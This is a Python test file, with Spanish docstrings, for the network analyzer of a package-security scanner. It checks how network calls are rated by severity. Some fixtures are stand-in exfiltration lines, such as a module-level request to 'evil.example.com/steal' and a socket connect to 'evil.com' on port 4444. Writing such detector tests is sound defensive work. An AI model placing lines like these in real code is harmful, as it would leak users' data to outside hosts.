"""Tests for NetworkAnalyzer."""

from pkgxray.analyzers.network import NetworkAnalyzer
from pkgxray.analyzers.base import Severity


def test_import_socket_not_flagged():
    """Importar socket es legítimo; no debe generar findings."""
    analyzer = NetworkAnalyzer()
    findings = analyzer.analyze('import socket', 'test.py')
    assert len(findings) == 0


def test_import_requests_not_flagged():
    """Importar requests es legítimo; no debe generar findings."""
    analyzer = NetworkAnalyzer()
    findings = analyzer.analyze('import requests', 'test.py')
    assert len(findings) == 0


def test_import_urllib_request_not_flagged():
    """Importar urllib.request no genera findings — solo las llamadas reales."""
    analyzer = NetworkAnalyzer()
    findings = analyzer.analyze('import urllib.request', 'test.py')
    assert len(findings) == 0


def test_detects_requests_get_in_function():
    """requests.get() dentro de una función → HIGH."""
    analyzer = NetworkAnalyzer()
    code = 'def fetch(url):\n    return requests.get(url)'
    findings = analyzer.analyze(code, 'test.py')
    high = [f for f in findings if f.severity == Severity.HIGH]
    assert len(high) >= 1


def test_detects_requests_get_at_module_level():
    """requests.get() al nivel del módulo → CRITICAL (se ejecuta al importar)."""
    analyzer = NetworkAnalyzer()
    code = 'requests.get("http://evil.example.com/steal")'
    findings = analyzer.analyze(code, 'test.py')
    critical = [f for f in findings if f.severity == Severity.CRITICAL]
    assert len(critical) >= 1
    assert "nivel del módulo" in critical[0].description


def test_detects_urlopen():
    """urlopen() siempre es sospechoso."""
    analyzer = NetworkAnalyzer()
    code = 'def fetch():\n    urllib.request.urlopen("http://example.com")'
    findings = analyzer.analyze(code, 'test.py')
    assert len(findings) >= 1
    assert any(f.severity in (Severity.HIGH, Severity.CRITICAL) for f in findings)


def test_detects_socket_connect_in_function():
    """socket.connect() dentro de una función → HIGH."""
    analyzer = NetworkAnalyzer()
    code = 'def exfil():\n    sock.connect(("evil.com", 4444))'
    findings = analyzer.analyze(code, 'test.py')
    assert len(findings) >= 1


def test_safe_code_no_findings():
    analyzer = NetworkAnalyzer()
    findings = analyzer.analyze('x = 1 + 2\nprint(x)', 'test.py')
    assert len(findings) == 0


def test_syntax_error_no_crash():
    analyzer = NetworkAnalyzer()
    findings = analyzer.analyze('def broken(:\n  pass', 'test.py')
    assert isinstance(findings, list)


def test_analyzer_name():
    analyzer = NetworkAnalyzer()
    code = 'def fetch():\n    requests.get("http://example.com")'
    findings = analyzer.analyze(code, 'test.py')
    assert all(f.analyzer_name == "network" for f in findings)
